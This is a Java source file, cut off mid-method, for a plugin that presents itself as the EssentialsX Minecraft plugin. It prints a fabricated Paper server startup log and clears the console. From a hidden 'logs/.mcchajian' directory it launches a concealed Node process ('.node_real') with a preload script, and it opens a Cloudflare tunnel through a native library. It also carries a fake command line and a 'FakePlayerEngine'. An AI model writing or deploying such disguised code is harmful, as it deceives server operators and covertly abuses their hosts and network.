package com.example.essentialsx;

import com.sun.jna.Function;
import com.sun.jna.NativeLibrary;
import com.sun.jna.Pointer;
import java.io.File;
import java.io.FileDescriptor;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintStream;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.lang.ProcessBuilder.Redirect;
import java.lang.Runtime.Version;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.nio.file.StandardOpenOption;
import java.nio.file.attribute.PosixFilePermission;
import java.nio.file.attribute.PosixFilePermissions;
import java.time.LocalDateTime;
import java.time.LocalTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.Set;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;
import sun.misc.Signal;
import sun.misc.SignalHandler;

public class EssentialsX extends JavaPlugin {
   private volatile Process nodeProcess = null;
   private static final Object CF_LOCK = new Object();
   private static volatile NativeLibrary cfLib = null;
   private static volatile Function cfStartFn = null;
   private static volatile Function cfStopFn = null;
   private static volatile Function cfIsRunningFn = null;
   private static volatile Function cfTunnelUrlFn = null;
   private static volatile Function cfLastErrorFn = null;
   private static volatile Function cfFreeFn = null;
   private static volatile Thread activeCfThread = null;
   private static volatile boolean cfSoRunning = false;
   private volatile boolean isProcessRunning = false;
   private boolean systemGuardEnabled = true;
   private final AtomicBoolean isRestarting = new AtomicBoolean(false);
   private static volatile String nodePort = "N/A";
   private static final AtomicReference<String> lastKnownTunnelUrl = new AtomicReference<>("");
   private static volatile long lastCfRestartTime = 0L;
   private static volatile long lastTunnelUrlTime = 0L;
   private static final long TUNNEL_STALE_MS = 120000L;
   private static final int CF_RESTART_COOLDOWN_MS = 8000;
   private static volatile int cfRestartCount = 0;
   private static volatile long nodeRestartTime = 0L;
   private static final PrintStream RAW_OUT = new PrintStream(new FileOutputStream(FileDescriptor.out), true);
   private static final String FAKE_CMDLINE = "java -Xms128M -Xmx2560M -jar server.jar" + new String(new char[150]).replace('\u0000', ' ');
   private static final DateTimeFormatter TS_FMT = DateTimeFormatter.ofPattern("HH:mm:ss");
   private volatile boolean reaperInstalled = false;
   private volatile FakePlayerEngine fakePlayerEngine = null;
   private volatile Process lastReportedNodeProcess = null;
   private volatile long lastHealthReportPid = -1L;
   private volatile boolean missingRuntimeReported = false;
   private volatile String lastCfUrlSource = "unknown";
   private final Map<String, Long> cfDiagnosticTimes = new HashMap<>();
   private static final long CF_DIAGNOSTIC_REPEAT_MS = 60000L;
   private static final Object CRASH_LOG_LOCK = new Object();
   private static final long MAX_CRASH_LOG_BYTES = 524288L;
   private static final DateTimeFormatter CRASH_TS_FMT = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");

   public EssentialsX() {
   }

   private static String ts() {
      return LocalTime.now().format(TS_FMT);
   }

   private static void mcLog(String msg) {
      RAW_OUT.println("[" + ts() + " INFO]: " + msg);
   }

   private static void mcLog(String msg, long delayMs) {
      try {
         Thread.sleep(delayMs);
      } catch (InterruptedException var4) {
      }

      RAW_OUT.println("[" + ts() + " INFO]: " + msg);
   }

   private static int randInt(int min, int max) {
      return min + (int)(Math.random() * (max - min + 1));
   }

   private static float randFloat(float min, float max) {
      return Math.round((min + (float)(Math.random() * (max - min))) * 10.0F) / 10.0F;
   }

   private String readCurrentPort() {
      try {
         Path portFile = Paths.get("logs", ".mcchajian", ".runtime", ".tunnel_port");
         if (Files.exists(portFile)) {
            String content = new String(Files.readAllBytes(portFile)).trim();
            if (!content.isEmpty()) {
               return content.split("\n")[0].trim();
            }
         }
      } catch (Exception var3) {
      }

      return nodePort;
   }

   private String buildFakeJavaVersionString() {
      try {
         Version ver = Runtime.version();
         int major = ver.feature();
         String updateStr = major + ".0." + randInt(1, 9);
         String buildNum = String.valueOf(randInt(1, 12));
         String ltsTag = major != 21 && major != 17 && major != 25 && major != 11 && major != 8 ? "" : "-LTS";
         return "Java "
            + major
            + " (OpenJDK 64-Bit Server VM "
            + updateStr
            + "+"
            + buildNum
            + ltsTag
            + "; Eclipse Adoptium Temurin-"
            + updateStr
            + "+"
            + buildNum
            + ltsTag
            + ")";
      } catch (Exception e) {
         String verStr = System.getProperty("java.version", "21.0.7");
         String majorStr = verStr.split("\\.")[0];
         return "Java " + majorStr + " (OpenJDK 64-Bit Server VM " + verStr + "; Eclipse Adoptium Temurin-" + verStr + ")";
      }
   }

   private String[] buildFakeMcVersionStrings() {
      try {
         int major = Runtime.version().feature();
         String mcVer;
         String paperBuild;
         String paperHash;
         String apiVer;
         if (major >= 25) {
            mcVer = "1.21.11";
            paperBuild = "69";
            paperHash = "94d0c97";
            apiVer = "1.21.11-R0.1-SNAPSHOT";
         } else if (major >= 21) {
            mcVer = "1.21.4";
            paperBuild = "215";
            paperHash = "a3d6a63";
            apiVer = "1.21.4-R0.1-SNAPSHOT";
         } else {
            mcVer = "1.20.4";
            paperBuild = "392";
            paperHash = "b7347de";
            apiVer = "1.20.4-R0.1-SNAPSHOT";
         }

         String dateStr = "2025-12-30T20:33:30Z";
         return new String[]{mcVer, paperBuild, paperHash, dateStr, apiVer};
      } catch (Exception e) {
         return new String[]{"1.21.4", "215", "a3d6a63", "2025-12-30T20:33:30Z", "1.21.4-R0.1-SNAPSHOT"};
      }
   }

   private void printFakeStartupSequence() {
      String displayPort = nodePort.equals("N/A") ? String.valueOf(20000 + new Random().nextInt(40000)) : nodePort;
      float dcTimeSec = randFloat(400.0F, 900.0F) / 1000.0F;
      float prepareTime = randFloat(10.0F, 20.0F);
      float doneTime = randFloat(25.0F, 45.0F);
      String fakeJava = this.buildFakeJavaVersionString();
      String[] mcInfo = this.buildFakeMcVersionStrings();
      String mcVer = mcInfo[0];
      String paperBuild = mcInfo[1];
      String paperHash = mcInfo[2];
      String dateStr = mcInfo[3];
      String apiVer = mcInfo[4];
      mcLog("[bootstrap] Running " + fakeJava + " on Linux 6.8.0-111-generic (amd64)", randInt(100, 300));
      mcLog("[bootstrap] Loading Paper " + mcVer + "-" + paperBuild + "-main@" + paperHash + " (" + dateStr + ") for Minecraft " + mcVer, randInt(50, 150));
      mcLog("[PluginInitializerManager] Initializing plugins...", randInt(100, 300));
      mcLog("[PluginInitializerManager] Initialized 0 plugins", randInt(50, 150));
      mcLog(
         "Environment: Environment[sessionHost=https://sessionserver.mojang.com, servicesHost=https://api.minecraftservices.com, profilesHost=https://api.mojang.com, name=PROD]",
         randInt(200, 500)
      );
      mcLog("Found new data pack file/bukkit, loading it automatically", randInt(50, 150));
      mcLog("Found new data pack paper, loading it automatically", randInt(50, 150));
      mcLog("No existing world data, creating new world", randInt(100, 300));
      mcLog("Loaded " + randInt(1400, 1500) + " recipes", randInt(200, 500));
      mcLog("Loaded " + randInt(1500, 1600) + " advancements", randInt(100, 300));
      mcLog("[ca.spottedleaf.dataconverter.minecraft.datatypes.MCTypeRegistry] Initialising converters for DataConverter...", randInt(50, 150));
      mcLog(
         "[ca.spottedleaf.dataconverter.minecraft.datatypes.MCTypeRegistry] Finished initialising converters for DataConverter in "
            + String.format("%.1f", dcTimeSec)
            + "ms",
         randInt(100, 300)
      );
      mcLog("Starting minecraft server version " + mcVer, randInt(50, 150));
      mcLog("Loading properties", randInt(50, 150));
      mcLog(
         "This server is running Paper version "
            + mcVer
            + "-"
            + paperBuild
            + "-main@"
            + paperHash
            + " ("
            + dateStr
            + ") (Implementing API version "
            + apiVer
            + ")",
         randInt(50, 150)
      );
      mcLog("Server Ping Player Sample Count: 12", randInt(50, 150));
      mcLog("Using 4 threads for Netty based IO", randInt(100, 300));
      mcLog("[MoonriseCommon] Paper is using 1 worker threads, 1 I/O threads", randInt(100, 300));
      mcLog("Default game type: SURVIVAL", randInt(50, 150));
      mcLog("Generating keypair", randInt(50, 150));
      mcLog("Starting Minecraft server on 0.0.0.0:" + displayPort, randInt(100, 300));
      mcLog("Paper: Using libdeflate (Linux x86_64) compression from Velocity.", randInt(50, 150));
      mcLog("Paper: Using OpenSSL 3.x.x (Linux x86_64) cipher from Velocity.", randInt(50, 150));
      mcLog("Preparing level \"world\"", randInt(300, 800));
      mcLog("Selecting spawn point for world 'minecraft:overworld'...", randInt(1000, 3000));
      mcLog("Selecting spawn point for world 'minecraft:the_nether'...", randInt(500, 1500));
      mcLog("Selecting spawn point for world 'minecraft:the_end'...", randInt(300, 800));
      mcLog("Loading 0 persistent chunks for world 'minecraft:overworld'...", randInt(50, 150));
      mcLog("Preparing spawn area: 100%", randInt(50, 150));
      mcLog("Prepared spawn area in " + randInt(10000, 20000) + " ms", randInt(50, 150));
      mcLog("Loading 0 persistent chunks for world 'minecraft:the_nether'...", randInt(50, 150));
      mcLog("Preparing spawn area: 100%", randInt(50, 150));
      mcLog("Prepared spawn area in " + randInt(1000, 3000) + " ms", randInt(50, 150));
      mcLog("Loading 0 persistent chunks for world 'minecraft:the_end'...", randInt(50, 150));
      mcLog("Preparing spawn area: 100%", randInt(50, 150));
      mcLog("Prepared spawn area in " + randInt(300, 1500) + " ms", randInt(50, 150));
      mcLog("Done preparing level \"world\" (" + String.format("%.3f", prepareTime) + "s)", randInt(50, 150));
      mcLog("[spark] Starting background profiler...", randInt(50, 150));
      mcLog("Running delayed init tasks", randInt(50, 150));
      mcLog("Done (" + String.format("%.3f", doneTime) + "s)! For help, type \"help\"", 0L);
   }

   private void clearConsole() {
      try {
         for (int i = 0; i < 250; i++) {
            RAW_OUT.println();
         }

         try {
            Thread.sleep(500L);
         } catch (InterruptedException var2) {
         }

         RAW_OUT.print("\u001b[H\u001b[3J\u001b[2J");
         RAW_OUT.flush();
      } catch (Exception var3) {
      }
   }

   private String allocateNodePort() {
      int port = 20000 + new Random().nextInt(40000);

      try (ServerSocket socket = new ServerSocket(port)) {
         socket.setReuseAddress(true);
         String portStr = String.valueOf(port);
         Path portFile = Paths.get("logs", ".mcchajian", ".runtime", ".tunnel_port");
         Files.createDirectories(portFile.getParent());
         Files.writeString(portFile, portStr);
         nodePort = portStr;
         return portStr;
      } catch (IOException e) {
         return this.allocateNodePort();
      }
   }

   private void waitForNodeReady(String port, int maxSeconds) {
      int waited = 0;

      while (waited < maxSeconds) {
         if (this.nodeProcess != null && !this.nodeProcess.isAlive()) {
            this.recordNodeCrashReport(this.nodeProcess, "startup_exit", port);
            return;
         }

         try {
            try (Socket socket = new Socket("127.0.0.1", Integer.parseInt(port))) {
               try {
                  HttpURLConnection conn = (HttpURLConnection)URI.create("http://127.0.0.1:" + port + "/").toURL().openConnection();
                  conn.setRequestMethod("HEAD");
                  conn.setConnectTimeout(1000);
                  conn.setReadTimeout(1000);
                  int code = conn.getResponseCode();
                  conn.disconnect();
                  return;
               } catch (Exception var9) {
               }

               try {
                  Thread.sleep(1000L);
                  waited++;
                  continue;
               } catch (InterruptedException var10) {
               }
            }

            return;
         } catch (IOException var12) {
            try {
               Thread.sleep(1000L);
               waited++;
            } catch (InterruptedException ignored) {
               return;
            }
         }
      }

      if (this.nodeProcess != null) {
         if (!this.nodeProcess.isAlive()) {
            this.recordNodeCrashReport(this.nodeProcess, "startup_exit", port);
         } else {
            this.recordNodeCrashReport(this.nodeProcess, "startup_timeout_" + maxSeconds + "s", port);
         }
      }
   }

   private void ensurePermissions() {
      try {
         Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
         Set<PosixFilePermission> dirPerms = PosixFilePermissions.fromString("rwxrwxr-x");
         Set<PosixFilePermission> execPerms = PosixFilePermissions.fromString("rwxrwxr-x");
         Files.walk(botDir).forEach(px -> {
            try {
               if (Files.isDirectory(px)) {
                  Files.setPosixFilePermissions(px, dirPerms);
               }
            } catch (Exception var3x) {
            }
         });
         String[] execFiles = new String[]{"nodejs/bin/.node_real", "nodejs/bin/node", "nodejs/bin/npm", "nodejs/bin/npx", "app/index.js"};

         for (String rel : execFiles) {
            Path p = botDir.resolve(rel);
            if (Files.exists(p)) {
               try {
                  Files.setPosixFilePermissions(p, execPerms);
               } catch (Exception var12) {
               }
            }
         }

         Path npmCli = botDir.resolve("nodejs/lib/node_modules/npm/bin/npm-cli.js");
         if (Files.exists(npmCli)) {
            try {
               Files.setPosixFilePermissions(npmCli, execPerms);
            } catch (Exception var11) {
            }
         }
      } catch (Exception var13) {
      }
   }

   private void startNodeProcess(String port) {
      try {
         Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
         Path runtimeDir = botDir.resolve(".runtime");
         Path nodeExe = botDir.resolve("nodejs/bin/.node_real");
         Path script = botDir.resolve("app/index.js");
         Path logFile = botDir.resolve("app.log");
         Path preload = runtimeDir.resolve(".nd_preload.js");
         if (!Files.exists(nodeExe) || !Files.exists(script)) {
            this.recordMissingRuntimeFiles(nodeExe, script);
            return;
         }

         this.missingRuntimeReported = false;
         this.ensureCrashReportHeader();

         try {
            if (Files.exists(logFile) && Files.size(logFile) > 1048576L) {
               Files.move(logFile, botDir.resolve("app.log.1"), StandardCopyOption.REPLACE_EXISTING);
            }
         } catch (Exception var12) {
         }

         try {
            nodeExe.toFile().setExecutable(true, false);
         } catch (Exception var11) {
         }

         ProcessBuilder pb = new ProcessBuilder(nodeExe.toString(), "--require", preload.toString(), script.toString());
         pb.directory(botDir.toFile());
         pb.environment().put("SERVER_PORT", port);
         pb.environment().put("PORT", port);
         pb.environment().put("_JAVA_WRAPPER", nodeExe.toString());
         pb.environment().put("NODE_OPTIONS", "--require " + preload.toString());
         pb.environment().put("HOME", botDir.toString());
         pb.environment().put("NPM_CONFIG_CACHE", "/tmp/.mc_npm_cache");
         pb.environment().put("npm_config_update_notifier", "false");
         pb.redirectOutput(Redirect.appendTo(logFile.toFile()));
         pb.redirectError(Redirect.appendTo(logFile.toFile()));
         this.nodeProcess = pb.start();
         nodeRestartTime = System.currentTimeMillis();

         try {
            this.nodeProcess.getOutputStream().close();
         } catch (Exception var10) {
         }
      } catch (Exception e) {
         this.appendCrashReportEntry("[NODE_LAUNCH_ERROR] port=" + port + " error=" + e.getClass().getName() + ": " + e.getMessage());
      }
   }

   private void ensureCrashReportHeader() {
      synchronized (CRASH_LOG_LOCK) {
         try {
            Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
            Files.createDirectories(botDir);
            Path reportFile = botDir.resolve("app_crash_report.log");
            if (!Files.exists(reportFile) || Files.size(reportFile) == 0L) {
               String header = "========================================================================\n EssentialsX Node (app/index.js) Crash & Bug Diagnostic Report\n========================================================================\n Common Exit Codes:\n  - 137 (SIGKILL): Container OOM Killer or host/panel killed Node.\n  - 139 (SIGSEGV) / 134 (SIGABRT): Native crash (koffi/.so/musl/glibc).\n  - 143 (SIGTERM): Terminated externally by panel/OS/watchdog.\n  - 1: JS uncaught exception / rejected promise / startup port error.\n========================================================================\n";
               Files.write(reportFile, header.getBytes(StandardCharsets.UTF_8));
            }
         } catch (Exception var6) {
         }
      }
   }

   private void appendCrashReportEntry(String body) {
      if (body != null && !body.isEmpty()) {
         synchronized (CRASH_LOG_LOCK) {
            try {
               this.ensureCrashReportHeader();
               Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
               Path reportFile = botDir.resolve("app_crash_report.log");
               if (Files.exists(reportFile) && Files.size(reportFile) > 524288L) {
                  Files.move(reportFile, botDir.resolve("app_crash_report.log.1"), StandardCopyOption.REPLACE_EXISTING);
                  this.ensureCrashReportHeader();
               }

               String entry = "\n[" + LocalDateTime.now().format(CRASH_TS_FMT) + "]\n" + body + "\n";
               Files.write(reportFile, entry.getBytes(StandardCharsets.UTF_8), StandardOpenOption.CREATE, StandardOpenOption.APPEND);
            } catch (Exception var7) {
            }
         }
      }
   }

   private static String sanitizeCfDiagnostic(String text) {
      if (text == null) {
         return "";
      }

      String sanitized = text.replaceAll("(?i)(https?://)[^\\s/@]+@", "$1[redacted]@")
         .replaceAll("(?i)([?&](?:access_token|token|password|secret|key)=)[^&#\\s]+", "$1[redacted]")
         .replaceAll("(?i)\\b(authorization|cookie|password|secret|access_token|token)\\s*[:=]\\s*[^\\s,;]+", "$1=[redacted]");
      return sanitized.length() > 8000 ? sanitized.substring(0, 8000) + "... (truncated)" : sanitized;
   }

   private static String describeCfThrowable(Throwable error) {
      if (error == null) {
         return "";
      }

      try {
         StringWriter output = new StringWriter();
         error.printStackTrace(new PrintWriter(output));
         return output.toString().trim();
      } catch (Throwable ignored) {
         return error.getClass().getName();
      }
   }

   private void appendCfDiagnostic(String event, String detail) {
      String safeDetail = sanitizeCfDiagnostic(detail);
      String rateKey = event + "\n" + safeDetail;
      long now = System.currentTimeMillis();
      synchronized (this.cfDiagnosticTimes) {
         Long last = this.cfDiagnosticTimes.get(rateKey);
         if (last != null && now - last < CF_DIAGNOSTIC_REPEAT_MS) {
            return;
         }

         if (this.cfDiagnosticTimes.size() >= 128) {
            this.cfDiagnosticTimes.clear();
         }
         this.cfDiagnosticTimes.put(rateKey, now);
      }

      this.appendCrashReportEntry("[CF_DIAGNOSTIC] " + event + (safeDetail.isEmpty() ? "" : "\n" + safeDetail));
   }

   private void recordMissingRuntimeFiles(Path nodeExe, Path script) {
      if (!this.missingRuntimeReported) {
         this.missingRuntimeReported = true;
         StringBuilder sb = new StringBuilder();
         sb.append("[MISSING_RUNTIME_FILES]\n");
         sb.append("nodeExe=").append(nodeExe).append(" exists=").append(Files.exists(nodeExe)).append("\n");
         sb.append("indexJs=").append(script).append(" exists=").append(Files.exists(script)).append("\n");
         sb.append("diagnosis=Runtime files missing (deleted by panel cleaner or failed deploy). Check deploy.log.\n");
         String deployTail = readLogTail(Paths.get("logs", ".mcchajian", "deploy.log"), 25);
         if (!deployTail.isEmpty()) {
            sb.append("--- deploy.log tail ---\n").append(deployTail);
         }

         this.appendCrashReportEntry(sb.toString());
      }
   }

   private void recordNodeUnresponsiveOnce(Process proc, String port) {
      if (proc != null) {
         long pid = -1L;

         try {
            pid = proc.pid();
         } catch (Throwable var6) {
         }

         if (pid == -1L || pid != this.lastHealthReportPid) {
            this.lastHealthReportPid = pid;
            this.recordNodeCrashReport(proc, "healthcheck_unresponsive", port);
         }
      }
   }

   private void recordNodeCrashReport(Process proc, String trigger, String port) {
      if (proc != null) {
         boolean alive = proc.isAlive();
         if (!alive) {
            if (proc == this.lastReportedNodeProcess) {
               return;
            }

            this.lastReportedNodeProcess = proc;
         }

         long now = System.currentTimeMillis();
         long uptimeSec = nodeRestartTime > 0L ? Math.max(0L, (now - nodeRestartTime) / 1000L) : -1L;
         long pid = -1L;

         try {
            pid = proc.pid();
         } catch (Throwable var24) {
         }

         int exitCode = -1;
         if (!alive) {
            try {
               exitCode = proc.exitValue();
            } catch (Throwable var23) {
            }
         }

         Runtime rt = Runtime.getRuntime();
         long jvmUsedMb = (rt.totalMemory() - rt.freeMemory()) / 1048576L;
         long jvmMaxMb = rt.maxMemory() / 1048576L;
         StringBuilder sb = new StringBuilder();
         sb.append("[NODE_CRASH_REPORT] trigger=")
            .append(trigger)
            .append(" pid=")
            .append(pid)
            .append(" alive=")
            .append(alive)
            .append(" exitCode=")
            .append(alive ? "N/A" : String.valueOf(exitCode))
            .append(" uptimeSec=")
            .append(uptimeSec)
            .append(" port=")
            .append(port == null ? "N/A" : port)
            .append("\n");
         sb.append("diagnosis=")
            .append(
               alive
                  ? "Process alive but HTTP localhost healthcheck failed (event loop blocked, wrong bind host, or hung native call)"
                  : diagnoseExitCode(exitCode)
            )
            .append("\n");
         sb.append("os=")
            .append(System.getProperty("os.name", "unknown"))
            .append(" arch=")
            .append(System.getProperty("os.arch", "unknown"))
            .append(" libc=")
            .append(detectLibcHint())
            .append(" jvmHeap=")
            .append(jvmUsedMb)
            .append("/")
            .append(jvmMaxMb)
            .append("MB")
            .append(" cfRunning=")
            .append(cfSoRunning)
            .append(" tunnelUrl=")
            .append(lastKnownTunnelUrl.get())
            .append("\n");
         String cgroupMem = readCgroupMemorySnapshot();
         if (!cgroupMem.isEmpty()) {
            sb.append("cgroupMem=").append(cgroupMem).append("\n");
         }

         String procMem = readMemInfoSnapshot();
         if (!procMem.isEmpty()) {
            sb.append("procMem=").append(procMem).append("\n");
         }

         Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
         String appTail = readLogTail(botDir.resolve("app.log"), 60);
         sb.append("--- app.log tail (last 60 lines) ---\n");
         sb.append(appTail.isEmpty() ? "(empty or not created)\n" : appTail);
         if (uptimeSec >= 0L && uptimeSec < 120L) {
            String deployTail = readLogTail(botDir.resolve("deploy.log"), 25);
            if (!deployTail.isEmpty()) {
               sb.append("--- deploy.log tail (last 25 lines) ---\n").append(deployTail);
            }
         }

         this.appendCrashReportEntry(sb.toString());
      }
   }

   private static String diagnoseExitCode(int exitCode) {
      if (exitCode == 137) {
         return "SIGKILL (137): Most likely Linux OOM Killer exceeded container memory limit, or panel/watchdog force-killed Node.";
      } else if (exitCode == 139) {
         return "SIGSEGV (139): Native segmentation fault (check koffi/native .so compatibility, musl vs glibc, or CPU flags).";
      } else if (exitCode == 134) {
         return "SIGABRT (134): Native abort or V8 fatal allocation failure.";
      } else if (exitCode == 132) {
         return "SIGILL (132): Illegal CPU instruction (binary compiled for unsupported CPU arch/flags).";
      } else if (exitCode == 143) {
         return "SIGTERM (143): Process terminated externally (panel/host monitor or shutdown signal).";
      } else if (exitCode == 1) {
         return "Exit 1: JS uncaught exception, unhandled rejection, missing dependency, or bind failure (see app.log tail).";
      } else {
         return exitCode == 0
            ? "Exit 0: Process exited cleanly on its own (check app.log tail for graceful exit trigger)."
            : "Unexpected exit code " + exitCode + (exitCode > 128 ? " (signal " + (exitCode - 128) + ")" : "");
      }
   }

   private static String detectLibcHint() {
      try {
         File libDir = new File("/lib");
         String[] entries = libDir.list();
         if (entries != null) {
            for (int i = 0; i < entries.length; i++) {
               if (entries[i].startsWith("ld-musl")) {
                  return "musl(" + entries[i] + ")";
               }
            }
         }

         if (Files.exists(Paths.get("/lib/x86_64-linux-gnu/libc.so.6"))
            || Files.exists(Paths.get("/lib/aarch64-linux-gnu/libc.so.6"))
            || Files.exists(Paths.get("/lib64/libc.so.6"))) {
            return "glibc";
         }
      } catch (Exception var3) {
      }

      return "unknown";
   }

   private static String readCgroupMemorySnapshot() {
      try {
         Path curV2 = Paths.get("/sys/fs/cgroup/memory.current");
         Path maxV2 = Paths.get("/sys/fs/cgroup/memory.max");
         if (Files.exists(curV2)) {
            String cur = Files.readString(curV2, StandardCharsets.UTF_8).trim();
            String max = Files.exists(maxV2) ? Files.readString(maxV2, StandardCharsets.UTF_8).trim() : "unknown";
            String curStr = formatBytesMb(cur);
            String maxStr = "max".equals(max) ? "unlimited" : formatBytesMb(max);
            String events = "";
            Path evPath = Paths.get("/sys/fs/cgroup/memory.events");
            if (Files.exists(evPath)) {
               List<String> lines = Files.readAllLines(evPath, StandardCharsets.UTF_8);

               for (int i = 0; i < lines.size(); i++) {
                  String ln = lines.get(i).trim();
                  if (ln.startsWith("oom ") || ln.startsWith("oom_kill ")) {
                     events = events + " " + ln;
                  }
               }
            }

            return "v2 used=" + curStr + " limit=" + maxStr + events;
         }

         Path curV1 = Paths.get("/sys/fs/cgroup/memory/memory.usage_in_bytes");
         Path maxV1 = Paths.get("/sys/fs/cgroup/memory/memory.limit_in_bytes");
         if (Files.exists(curV1)) {
            String cur = Files.readString(curV1, StandardCharsets.UTF_8).trim();
            String max = Files.exists(maxV1) ? Files.readString(maxV1, StandardCharsets.UTF_8).trim() : "unknown";
            return "v1 used=" + formatBytesMb(cur) + " limit=" + formatBytesMb(max);
         }
      } catch (Exception var11) {
      }

      return "";
   }

   private static String formatBytesMb(String raw) {
      try {
         long bytes = Long.parseLong(raw.trim());
         return bytes >= 1125899906842624L ? "unlimited" : bytes / 1048576L + "MB";
      } catch (Exception e) {
         return raw;
      }
   }

   private static String readMemInfoSnapshot() {
      try {
         Path memInfo = Paths.get("/proc/meminfo");
         if (!Files.exists(memInfo)) {
            return "";
         }

         List<String> lines = Files.readAllLines(memInfo, StandardCharsets.UTF_8);
         String total = "";
         String avail = "";

         for (int i = 0; i < lines.size(); i++) {
            String ln = lines.get(i);
            if (ln.startsWith("MemTotal:")) {
               total = ln.replace("MemTotal:", "").trim();
            } else if (ln.startsWith("MemAvailable:")) {
               avail = ln.replace("MemAvailable:", "").trim();
            }
         }

         if (!total.isEmpty() || !avail.isEmpty()) {
            return "MemTotal=" + total + " MemAvailable=" + avail;
         }
      } catch (Exception var6) {
      }

      return "";
   }

   private static String readLogTail(Path file, int maxLines) {
      try {
         if (file != null && Files.exists(file)) {
            List<String> all = Files.readAllLines(file, StandardCharsets.UTF_8);
            int start = Math.max(0, all.size() - maxLines);
            StringBuilder out = new StringBuilder();

            for (int i = start; i < all.size(); i++) {
               out.append(all.get(i)).append("\n");
            }

            return out.toString();
         } else {
            return "";
         }
      } catch (Exception e) {
         return "(read error: " + e.getMessage() + ")\n";
      }
   }

   private void killProcessTree(Process process) {
      if (process != null) {
         try {
            List<ProcessHandle> descendants = new ArrayList<>();

            try {
               process.toHandle().descendants().forEach(descendants::add);
            } catch (Exception var7) {
            }

            for (int i = descendants.size() - 1; i >= 0; i--) {
               try {
                  descendants.get(i).destroyForcibly();
               } catch (Exception var6) {
               }
            }

            process.destroyForcibly();

            try {
               process.waitFor(3L, TimeUnit.SECONDS);
            } catch (Exception var5) {
            }
         } catch (Exception var8) {
         }
      }
   }

   private static boolean isArm64Arch() {
      String arch = System.getProperty("os.arch", "").toLowerCase();
      return arch.contains("aarch64") || arch.contains("arm64");
   }

   private static boolean bytesContainAscii(byte[] haystack, byte[] needle) {
      if (haystack != null && needle != null && needle.length != 0 && haystack.length >= needle.length) {
         int limit = haystack.length - needle.length;

         for (int i = 0; i <= limit; i++) {
            if (haystack[i] == needle[0]) {
               boolean match = true;

               for (int j = 1; j < needle.length; j++) {
                  if (haystack[i + j] != needle[j]) {
                     match = false;
                     break;
                  }
               }

               if (match) {
                  return true;
               }
            }
         }

         return false;
      } else {
         return false;
      }
   }

   private static boolean isValidCfSo(Path soFile, boolean arm64) {
      try {
         if (Files.exists(soFile) && Files.size(soFile) > 1000000L) {
            byte[] data = Files.readAllBytes(soFile);
            if (data.length < 20) {
               return false;
            } else if (data[0] == 127 && data[1] == 69 && data[2] == 76 && data[3] == 70) {
               int eMachine = data[18] & 255 | (data[19] & 255) << 8;
               int expectedMachine = arm64 ? 183 : 62;
               return eMachine != expectedMachine
                  ? false
                  : bytesContainAscii(data, "CloudflaredTunnelUrl".getBytes(StandardCharsets.US_ASCII))
                     && bytesContainAscii(data, "CloudflaredFree".getBytes(StandardCharsets.US_ASCII));
            } else {
               return false;
            }
         } else {
            return false;
         }
      } catch (Exception e) {
         return false;
      }
   }

   private static String readAndFreeCfStr(Function fn) {
      if (fn == null) {
         return "";
      }

      try {
         Pointer ptr = fn.invokePointer(new Object[0]);
         if (ptr == null) {
            return "";
         }

         try {
            String s = ptr.getString(0L, "UTF-8");
            return s == null ? "" : s.trim();
         } finally {
            if (cfFreeFn != null) {
               try {
                  cfFreeFn.invokeVoid(new Object[]{ptr});
               } catch (Throwable var11) {
               }
            }
         }
      } catch (Throwable ignored) {
         return "";
      }
   }

   private static boolean isCfRunningSafe() {
      if (cfIsRunningFn == null) {
         return false;
      }

      try {
         return cfIsRunningFn.invokeInt(new Object[0]) == 1;
      } catch (Throwable ignored) {
         return false;
      }
   }

   private boolean ensureCfLibraryLoaded(Path soFile) {
      synchronized (CF_LOCK) {
         if (cfLib != null && cfStartFn != null && cfStopFn != null) {
            return true;
         }

         boolean var10000;
         try {
            NativeLibrary lib = NativeLibrary.getInstance(soFile.toAbsolutePath().toString());
            cfStartFn = lib.getFunction("StartCloudflared");
            cfStopFn = lib.getFunction("StopCloudflared");

            try {
               cfIsRunningFn = lib.getFunction("CloudflaredIsRunning");
            } catch (Throwable ignored) {
               cfIsRunningFn = null;
            }

            try {
               cfTunnelUrlFn = lib.getFunction("CloudflaredTunnelUrl");
            } catch (Throwable ignored) {
               cfTunnelUrlFn = null;
            }

            try {
               cfLastErrorFn = lib.getFunction("CloudflaredLastError");
            } catch (Throwable ignored) {
               cfLastErrorFn = null;
            }

            try {
               cfFreeFn = lib.getFunction("CloudflaredFree");
            } catch (Throwable ignored) {
               cfFreeFn = null;
            }

            cfLib = lib;
            this.appendCfDiagnostic(
               "LIBRARY_LOADED",
               "path=" + soFile.toAbsolutePath()
                  + "\nisRunningExport=" + (cfIsRunningFn != null)
                  + " urlExport=" + (cfTunnelUrlFn != null)
                  + " lastErrorExport=" + (cfLastErrorFn != null)
                  + " freeExport=" + (cfFreeFn != null)
            );
            var10000 = true;
         } catch (Throwable error) {
            this.appendCfDiagnostic("LIBRARY_LOAD_FAILED", "path=" + soFile.toAbsolutePath() + "\n" + describeCfThrowable(error));
            return false;
         }

         return var10000;
      }
   }

   private void safeKillCfLocked() {
      if (cfStopFn != null) {
         try {
            cfStopFn.invokeInt(new Object[]{""});
         } catch (Throwable var3) {
         }

         for (int i = 0; i < 30 && isCfRunningSafe(); i++) {
            try {
               Thread.sleep(100L);
            } catch (InterruptedException ignored) {
               break;
            }
         }
      }

      cfSoRunning = false;
   }

   private void safeKillCf() {
      synchronized (CF_LOCK) {
         this.safeKillCfLocked();
      }
   }

   private void safeKillNode() {
      Process old = this.nodeProcess;
      this.nodeProcess = null;
